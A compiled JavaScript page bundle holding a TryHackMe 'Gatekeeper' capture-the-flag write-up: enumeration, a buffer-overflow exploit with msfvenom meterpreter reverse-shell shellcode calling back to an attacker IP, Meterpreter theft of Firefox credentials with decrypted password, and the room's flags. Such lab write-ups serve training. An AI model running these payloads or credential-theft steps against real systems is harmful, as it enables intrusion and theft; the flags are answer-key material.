"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[6612],{3905:(e,n,t)=>{t.d(n,{Zo:()=>c,kt:()=>m});var r=t(67294);function a(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function o(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function l(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?o(Object(t),!0).forEach((function(n){a(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function s(e,n){if(null==e)return{};var t,r,a=function(e,n){if(null==e)return{};var t,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)t=o[r],n.indexOf(t)>=0||(a[t]=e[t]);return a}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)t=o[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(a[t]=e[t])}return a}var i=r.createContext({}),x=function(e){var n=r.useContext(i),t=n;return e&&(t="function"==typeof e?e(n):l(l({},n),e)),t},c=function(e){var n=x(e.components);return r.createElement(i.Provider,{value:n},e.children)},p="mdxType",d={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},f=r.forwardRef((function(e,n){var t=e.components,a=e.mdxType,o=e.originalType,i=e.parentName,c=s(e,["components","mdxType","originalType","parentName"]),p=x(t),f=a,m=p["".concat(i,".").concat(f)]||p[f]||d[f]||o;return t?r.createElement(m,l(l({ref:n},c),{},{components:t})):r.createElement(m,l({ref:n},c))}));function m(e,n){var t=arguments,a=n&&n.mdxType;if("string"==typeof e||a){var o=t.length,l=new Array(o);l[0]=f;var s={};for(var i in n)hasOwnProperty.call(n,i)&&(s[i]=n[i]);s.originalType=e,s[p]="string"==typeof e?e:a,l[1]=s;for(var x=2;x<o;x++)l[x]=t[x];return r.createElement.apply(null,l)}return r.createElement.apply(null,t)}f.displayName="MDXCreateElement"},61942:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>i,contentTitle:()=>l,default:()=>d,frontMatter:()=>o,metadata:()=>s,toc:()=>x});var r=t(87462),a=(t(67294),t(3905));const o={},l="Gatekeeper",s={unversionedId:"Tryhackme/Gatekeeper/Gatekeeper",id:"Tryhackme/Gatekeeper/Gatekeeper",title:"Gatekeeper",description:"Can you get past the gate and through the fire?",source:"@site/writeups/Tryhackme/Gatekeeper/Gatekeeper.md",sourceDirName:"Tryhackme/Gatekeeper",slug:"/Tryhackme/Gatekeeper/",permalink:"/writeups/Tryhackme/Gatekeeper/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"GamingServer",permalink:"/writeups/Tryhackme/GamingServer/"},next:{title:"Geolocating Images",permalink:"/writeups/Tryhackme/Geolocating Images/Geolocating"}},i={},x=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Approach the Gates",id:"task-1-approach-the-gates",level:2},{value:"Task 2 Defeat the Gatekeeper and pass through the fire.",id:"task-2-defeat-the-gatekeeper-and-pass-through-the-fire",level:2}],c={toc:x},p="wrapper";function d(e){let{components:n,...o}=e;return(0,a.kt)(p,(0,r.Z)({},c,o,{components:n,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"gatekeeper"},"Gatekeeper"),(0,a.kt)("p",null,"Can you get past the gate and through the fire?"),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/gatekeeper"},"Gatekeeper")),(0,a.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,a.kt)("li",{parentName:"ul"},"SMB Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Reverse Engineering"),(0,a.kt)("li",{parentName:"ul"},"Buffer Overflow"),(0,a.kt)("li",{parentName:"ul"},"Meterpreter (enum_applications)"),(0,a.kt)("li",{parentName:"ul"},"Meterpreter (firefox_creds)")),(0,a.kt)("hr",null),(0,a.kt)("h2",{id:"task-1-approach-the-gates"},"Task 1 Approach the Gates"),(0,a.kt)("p",null,"Deploy the machine when you are ready to release the Gatekeeper."),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"No Answer Needed")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,a.kt)("h2",{id:"task-2-defeat-the-gatekeeper-and-pass-through-the-fire"},"Task 2 Defeat the Gatekeeper and pass through the fire."),(0,a.kt)("p",null,"Defeat the Gatekeeper to break the chains. But beware, fire awaits on the other side."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Gatekeeper$ sudo nmap -A -sS -sC -sV -O 10.10.119.230\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 12:07 CET\nNmap scan report for 10.10.119.230\nHost is up (0.029s latency).\nNot shown: 990 closed ports\nPORT      STATE SERVICE      VERSION\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)\n3389/tcp  open  tcpwrapped\n|_ssl-date: 2020-10-28T11:10:23+00:00; +1s from scanner time.\n31337/tcp open  Elite?\n| fingerprint-strings:\n|   FourOhFourRequest:\n|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0\n|     Hello\n|   GenericLines:\n|     Hello\n|     Hello\n|   GetRequest:\n|     Hello GET / HTTP/1.0\n|     Hello\n|   HTTPOptions:\n|     Hello OPTIONS / HTTP/1.0\n|     Hello\n|   Help:\n|     Hello HELP\n|   Kerberos:\n|     Hello !!!\n|   LDAPSearchReq:\n|     Hello 0\n|     Hello\n|   LPDString:\n|     Hello\n|     default!!!\n|   RTSPRequest:\n|     Hello OPTIONS / RTSP/1.0\n|     Hello\n|   SIPOptions:\n|     Hello OPTIONS sip:nm SIP/2.0\n|     Hello Via: SIP/2.0/TCP nm;branch=foo\n|     Hello From: <sip:nm@nm>;tag=root\n|     Hello To: <sip:nm2@nm2>\n|     Hello Call-ID: 50000\n|     Hello CSeq: 42 OPTIONS\n|     Hello Max-Forwards: 70\n|     Hello Content-Length: 0\n|     Hello Contact: <sip:nm@nm>\n|     Hello Accept: application/sdp\n|     Hello\n|   SSLSessionReq, TLSSessionReq, TerminalServerCookie:\n|_    Hello\n49152/tcp open  msrpc        Microsoft Windows RPC\n49153/tcp open  msrpc        Microsoft Windows RPC\n49154/tcp open  msrpc        Microsoft Windows RPC\n49160/tcp open  msrpc        Microsoft Windows RPC\n49161/tcp open  msrpc        Microsoft Windows RPC\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port31337-TCP:V=7.80%I=7%D=10/28%Time=5F9950F1%P=x86_64-pc-linux-gnu%r(\nSF:GetRequest,24,"Hello\\x20GET\\x20/\\x20HTTP/1\\.0\\r!!!\\nHello\\x20\\r!!!\\n")%\nSF:r(SIPOptions,142,"Hello\\x20OPTIONS\\x20sip:nm\\x20SIP/2\\.0\\r!!!\\nHello\\x2\nSF:0Via:\\x20SIP/2\\.0/TCP\\x20nm;branch=foo\\r!!!\\nHello\\x20From:\\x20<sip:nm@\nSF:nm>;tag=root\\r!!!\\nHello\\x20To:\\x20<sip:nm2@nm2>\\r!!!\\nHello\\x20Call-ID\nSF::\\x2050000\\r!!!\\nHello\\x20CSeq:\\x2042\\x20OPTIONS\\r!!!\\nHello\\x20Max-For\nSF:wards:\\x2070\\r!!!\\nHello\\x20Content-Length:\\x200\\r!!!\\nHello\\x20Contact\nSF::\\x20<sip:nm@nm>\\r!!!\\nHello\\x20Accept:\\x20application/sdp\\r!!!\\nHello\\\nSF:x20\\r!!!\\n")%r(GenericLines,16,"Hello\\x20\\r!!!\\nHello\\x20\\r!!!\\n")%r(HT\nSF:TPOptions,28,"Hello\\x20OPTIONS\\x20/\\x20HTTP/1\\.0\\r!!!\\nHello\\x20\\r!!!\\n\nSF:")%r(RTSPRequest,28,"Hello\\x20OPTIONS\\x20/\\x20RTSP/1\\.0\\r!!!\\nHello\\x20\nSF:\\r!!!\\n")%r(Help,F,"Hello\\x20HELP\\r!!!\\n")%r(SSLSessionReq,C,"Hello\\x20\nSF:\\x16\\x03!!!\\n")%r(TerminalServerCookie,B,"Hello\\x20\\x03!!!\\n")%r(TLSSes\nSF:sionReq,C,"Hello\\x20\\x16\\x03!!!\\n")%r(Kerberos,A,"Hello\\x20!!!\\n")%r(Fo\nSF:urOhFourRequest,47,"Hello\\x20GET\\x20/nice%20ports%2C/Tri%6Eity\\.txt%2eb\nSF:ak\\x20HTTP/1\\.0\\r!!!\\nHello\\x20\\r!!!\\n")%r(LPDString,12,"Hello\\x20\\x01d\nSF:efault!!!\\n")%r(LDAPSearchReq,17,"Hello\\x200\\x84!!!\\nHello\\x20\\x01!!!\\n\nSF:");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/28%OT=135%CT=1%CU=37648%PV=Y%DS=2%DC=T%G=Y%TM=5F995\nOS:1DA%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%T\nOS:S=7)OPS(O1=M508NW8ST11%O2=M508NW8ST11%O3=M508NW8NNT11%O4=M508NW8ST11%O5=\nOS:M508NW8ST11%O6=M508ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2\nOS:000)ECN(R=Y%DF=Y%T=80%W=2000%O=M508NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A\nOS:=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=\nOS:Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%R\nOS:D=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=\nOS:0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U\nOS:1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DF\nOS:I=N%T=80%CD=Z)\n\nNetwork Distance: 2 hops\nService Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 1h00m00s, deviation: 2h00m00s, median: 0s\n|_nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: <unknown>, NetBIOS MAC: 02:96:1a:44:9e:41 (unknown)\n| smb-os-discovery:\n|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)\n|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional\n|   Computer name: gatekeeper\n|   NetBIOS computer name: GATEKEEPER\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2020-10-28T07:10:08-04:00\n| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode:\n|   2.02:\n|_    Message signing enabled but not required\n| smb2-time:\n|   date: 2020-10-28T11:10:08\n|_  start_date: 2020-10-28T11:04:15\n\nTRACEROUTE (using port 443/tcp)\nHOP RTT      ADDRESS\n1   28.43 ms 10.8.0.1\n2   29.15 ms 10.10.119.230\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 249.17 seconds\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Gatekeeper$ smbclient -L \\\\10.10.119.230\nEnter WORKGROUP\\kali's password:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        Users           Disk\nSMB1 disabled -- no workgroup available\nkali@kali:~/CTFs/tryhackme/Gatekeeper$ smbclient \\\\\\\\10.10.119.230\\\\Users\nEnter WORKGROUP\\kali's password:\nTry \"help\" to get a list of possible commands.\nsmb: \\> ls\n  .                                  DR        0  Fri May 15 03:57:08 2020\n  ..                                 DR        0  Fri May 15 03:57:08 2020\n  Default                           DHR        0  Tue Jul 14 09:07:31 2009\n  desktop.ini                       AHS      174  Tue Jul 14 06:54:24 2009\n  Share                               D        0  Fri May 15 03:58:07 2020\n\n                7863807 blocks of size 4096. 3878855 blocks available\nsmb: \\Share\\> get gatekeeper.exe\ngetting file \\Share\\gatekeeper.exe of size 13312 as gatekeeper.exe (52.4 KiloBytes/sec) (average 52.4 KiloBytes/sec)\nsmb: \\Share\\> exit\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Gatekeeper$ msf-pattern_create -l 200\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-py"},'#!/usr/bin/python\n\nimport socket\n\nhost = "192.168.178.56"\nport = 31337\n\n# msf-pattern_create -l 200\n# Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag\npattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"\n\nio=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nio.connect((host, port))\nio.send(pattern + "\\n")\n\nio.close()\n\n')),(0,a.kt)("p",null,(0,a.kt)("img",{src:t(48610).Z,width:"499",height:"298"})),(0,a.kt)("p",null,"EIP = ",(0,a.kt)("inlineCode",{parentName:"p"},"39654138")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Gatekeeper$ msf-pattern_offset -l 200 -q 39654138\n[*] Exact match at offset 146\n")),(0,a.kt)("p",null,"offset = ",(0,a.kt)("inlineCode",{parentName:"p"},"146")),(0,a.kt)("p",null,(0,a.kt)("img",{src:t(3218).Z,width:"1146",height:"531"})),(0,a.kt)("p",null,"ESP address = ",(0,a.kt)("inlineCode",{parentName:"p"},"080414C3")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Gatekeeper$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.106.222 LPORT=9001 -b "\\x00\\x0a" -f py --var-name shellcode\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nFound 11 compatible encoders\nAttempting to encode payload with 1 iterations of x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded with size 368 (iteration=0)\nx86/shikata_ga_nai chosen with final size 368\nPayload size: 368 bytes\nFinal size of py file: 2067 bytes\nshellcode =  b""\nshellcode += b"\\xdb\\xd6\\xbf\\x29\\x1c\\x73\\x85\\xd9\\x74\\x24\\xf4"\nshellcode += b"\\x5b\\x31\\xc9\\xb1\\x56\\x83\\xeb\\xfc\\x31\\x7b\\x14"\nshellcode += b"\\x03\\x7b\\x3d\\xfe\\x86\\x79\\xd5\\x7c\\x68\\x82\\x25"\nshellcode += b"\\xe1\\xe0\\x67\\x14\\x21\\x96\\xec\\x06\\x91\\xdc\\xa1"\nshellcode += b"\\xaa\\x5a\\xb0\\x51\\x39\\x2e\\x1d\\x55\\x8a\\x85\\x7b"\nshellcode += b"\\x58\\x0b\\xb5\\xb8\\xfb\\x8f\\xc4\\xec\\xdb\\xae\\x06"\nshellcode += b"\\xe1\\x1a\\xf7\\x7b\\x08\\x4e\\xa0\\xf0\\xbf\\x7f\\xc5"\nshellcode += b"\\x4d\\x7c\\x0b\\x95\\x40\\x04\\xe8\\x6d\\x62\\x25\\xbf"\nshellcode += b"\\xe6\\x3d\\xe5\\x41\\x2b\\x36\\xac\\x59\\x28\\x73\\x66"\nshellcode += b"\\xd1\\x9a\\x0f\\x79\\x33\\xd3\\xf0\\xd6\\x7a\\xdc\\x02"\nshellcode += b"\\x26\\xba\\xda\\xfc\\x5d\\xb2\\x19\\x80\\x65\\x01\\x60"\nshellcode += b"\\x5e\\xe3\\x92\\xc2\\x15\\x53\\x7f\\xf3\\xfa\\x02\\xf4"\nshellcode += b"\\xff\\xb7\\x41\\x52\\xe3\\x46\\x85\\xe8\\x1f\\xc2\\x28"\nshellcode += b"\\x3f\\x96\\x90\\x0e\\x9b\\xf3\\x43\\x2e\\xba\\x59\\x25"\nshellcode += b"\\x4f\\xdc\\x02\\x9a\\xf5\\x96\\xae\\xcf\\x87\\xf4\\xa6"\nshellcode += b"\\x3c\\xaa\\x06\\x36\\x2b\\xbd\\x75\\x04\\xf4\\x15\\x12"\nshellcode += b"\\x24\\x7d\\xb0\\xe5\\x3d\\x69\\x43\\x39\\x85\\xfa\\xbd"\nshellcode += b"\\xba\\xf5\\xd3\\x79\\xee\\xa5\\x4b\\xab\\x8f\\x2e\\x8c"\nshellcode += b"\\x54\\x5a\\xda\\x86\\xc2\\x6f\\x12\\xfd\\xcc\\x18\\x20"\nshellcode += b"\\x01\\xd2\\xf1\\xad\\xe7\\x44\\x52\\xfd\\xb7\\x24\\x02"\nshellcode += b"\\xbd\\x67\\xcd\\x48\\x32\\x57\\xed\\x72\\x99\\xf0\\x84"\nshellcode += b"\\x9c\\x77\\xa8\\x30\\x04\\xd2\\x22\\xa0\\xc9\\xc9\\x4e"\nshellcode += b"\\xe2\\x42\\xfb\\xaf\\xad\\xa2\\x8e\\xa3\\xda\\xd4\\x70"\nshellcode += b"\\x3c\\x1b\\x71\\x70\\x56\\x1f\\xd3\\x27\\xce\\x1d\\x02"\nshellcode += b"\\x0f\\x51\\xdd\\x61\\x0c\\x96\\x21\\xf4\\x24\\xec\\x14"\nshellcode += b"\\x62\\x08\\x9a\\x58\\x62\\x88\\x5a\\x0f\\xe8\\x88\\x32"\nshellcode += b"\\xf7\\x48\\xdb\\x27\\xf8\\x44\\x48\\xf4\\x6d\\x67\\x38"\nshellcode += b"\\xa8\\x26\\x0f\\xc6\\x97\\x01\\x90\\x39\\xf2\\x11\\xd7"\nshellcode += b"\\xc5\\x80\\x3d\\x70\\xad\\x7a\\x7e\\x80\\x2d\\x11\\x7e"\nshellcode += b"\\xd0\\x45\\xee\\x51\\xdf\\xa5\\x0f\\x78\\x88\\xad\\x9a"\nshellcode += b"\\xed\\x7a\\x4c\\x9a\\x27\\xda\\xd0\\x9b\\xc4\\xc7\\xe3"\nshellcode += b"\\xe6\\xa5\\xf8\\x04\\x17\\xac\\x9c\\x05\\x17\\xd0\\xa2"\nshellcode += b"\\x3a\\xc1\\xe9\\xd0\\x7d\\xd1\\x4d\\xea\\xc8\\x74\\xe7"\nshellcode += b"\\x61\\x32\\x2a\\xf7\\xa3"\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Gatekeeper$ msfconsole -q\n[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp\nmsf5 exploit(windows/smb/ms17_010_eternalblue) > use multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf5 exploit(multi/handler) > options\n\nModule options (exploit/multi/handler):\n\n   Name  Current Setting  Required  Description\n   ----  ---------------  --------  -----------\n\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST                      yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Wildcard Target\n\n\nmsf5 exploit(multi/handler) > set LHOST 192.168.178.57\nLHOST => 192.168.178.57\nmsf5 exploit(multi/handler) > set LPORT 9001\nLPORT => 9001\nmsf5 exploit(multi/handler) > run\n\n[*] Started reverse TCP handler on 192.168.178.57:9001\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'[*] Sending stage (176195 bytes) to 10.10.158.239\n[*] Meterpreter session 2 opened (10.8.106.222:9001 -> 10.10.158.239:49175) at 2020-10-29 22:35:55 +0100\n\nmeterpreter > ls\nListing: C:\\Users\\natbat\\Desktop\n================================\n\nMode              Size   Type  Last modified              Name\n----              ----   ----  -------------              ----\n100666/rw-rw-rw-  1197   fil   2020-04-21 23:00:32 +0200  Firefox.lnk\n100666/rw-rw-rw-  282    fil   2020-04-21 22:57:04 +0200  desktop.ini\n100777/rwxrwxrwx  13312  fil   2020-04-20 07:27:17 +0200  gatekeeper.exe\n100777/rwxrwxrwx  135    fil   2020-04-22 00:51:58 +0200  gatekeeperstart.bat\n100666/rw-rw-rw-  140    fil   2020-05-15 03:24:52 +0200  user.txt.txt\n\nmeterpreter > cat user.txt.txt\n{H4lf_W4y_Th3r3}\n\nThe buffer overflow in this room is credited to Justin Steven and his\n"dostackbufferoverflowgood" program.  Thank you!\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"meterpreter > run post/windows/gather/enum_applications\n\n[*] Enumerating applications installed on GATEKEEPER\n\nInstalled Applications\n======================\n\n Name                                                                Version\n ----                                                                -------\n Amazon SSM Agent                                                    2.3.842.0\n Amazon SSM Agent                                                    2.3.842.0\n EC2ConfigService                                                    4.9.4222.0\n EC2ConfigService                                                    4.9.4222.0\n EC2ConfigService                                                    4.9.4222.0\n EC2ConfigService                                                    4.9.4222.0\n Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.20.27508  14.20.27508.1\n Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.20.27508  14.20.27508.1\n Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.20.27508  14.20.27508.1\n Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.20.27508  14.20.27508.1\n Microsoft Visual C++ 2019 X86 Additional Runtime - 14.20.27508      14.20.27508\n Microsoft Visual C++ 2019 X86 Additional Runtime - 14.20.27508      14.20.27508\n Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.20.27508         14.20.27508\n Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.20.27508         14.20.27508\n Mozilla Firefox 75.0 (x86 en-US)                                    75.0\n\n\n[+] Results stored in: /home/kali/.msf4/loot/20201029224002_default_10.10.158.239_host.application_541675.txt\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"meterpreter > run post/multi/gather/firefox_creds\n\n[-] Error loading USER S-1-5-21-663372427-3699997616-3390412905-1000: Hive could not be loaded, are you Admin?\n[*] Checking for Firefox profile in: C:\\Users\\natbat\\AppData\\Roaming\\Mozilla\\\n\n[*] Profile: C:\\Users\\natbat\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ljfn812a.default-release\n[+] Downloaded cert9.db: /home/kali/.msf4/loot/20201029224135_default_10.10.158.239_ff.ljfn812a.cert_790820.bin\n[+] Downloaded cookies.sqlite: /home/kali/.msf4/loot/20201029224136_default_10.10.158.239_ff.ljfn812a.cook_167160.bin\n[+] Downloaded key4.db: /home/kali/.msf4/loot/20201029224138_default_10.10.158.239_ff.ljfn812a.key4_624528.bin\n[+] Downloaded logins.json: /home/kali/.msf4/loot/20201029224140_default_10.10.158.239_ff.ljfn812a.logi_532867.bin\n\n[*] Profile: C:\\Users\\natbat\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\rajfzh3y.default\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Gatekeeper$ cp /home/kali/.msf4/loot/20201029224135_default_10.10.158.239_ff.ljfn812a.cert_790820.bin ./cert9.db\nkali@kali:~/CTFs/tryhackme/Gatekeeper$ cp /home/kali/.msf4/loot/20201029224136_default_10.10.158.239_ff.ljfn812a.cook_167160.bin ./cookies.sqlite\nkali@kali:~/CTFs/tryhackme/Gatekeeper$ cp /home/kali/.msf4/loot/20201029224138_default_10.10.158.239_ff.ljfn812a.key4_624528.bin ./key4.db\nkali@kali:~/CTFs/tryhackme/Gatekeeper$ cp /home/kali/.msf4/loot/20201029224140_default_10.10.158.239_ff.ljfn812a.logi_532867.bin ./logins.json\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Gatekeeper$ sudo /opt/firefox_decrypt/firefox_decrypt.py ./\n2020-10-29 22:54:18,141 - WARNING - profile.ini not found in ./\n2020-10-29 22:54:18,141 - WARNING - Continuing and assuming './' is a profile location\n\nMaster Password for profile ./:\n2020-10-29 22:54:31,027 - WARNING - Attempting decryption with no Master Password\n\nWebsite:   https://creds.com\nUsername: 'mayor'\nPassword: '8CL7O1N78MdrCIsV'\n")),(0,a.kt)("p",null,(0,a.kt)("img",{src:t(3872).Z,width:"529",height:"299"})),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"Locate and find the User Flag.")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"{H4lf_W4y_Th3r3}")),(0,a.kt)("ol",{start:2},(0,a.kt)("li",{parentName:"ol"},"Locate and find the Root Flag.")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"{Th3_M4y0r_C0ngr4tul4t3s_U}")))}d.isMDXComponent=!0},48610:(e,n,t)=>{t.d(n,{Z:()=>r});const r=t.p+"assets/images/2020-10-29_22-01-62e2caa3ee099f63270dc4e8deed6b75.png"},3218:(e,n,t)=>{t.d(n,{Z:()=>r});const r=t.p+"assets/images/2020-10-29_22-06-bba2aa39ff8294069d052801f69a719e.png"},3872:(e,n,t)=>{t.d(n,{Z:()=>r});const r=t.p+"assets/images/2020-10-29_22-59-2e9067962e77e9242903f711a7c3ca02.png"}}]);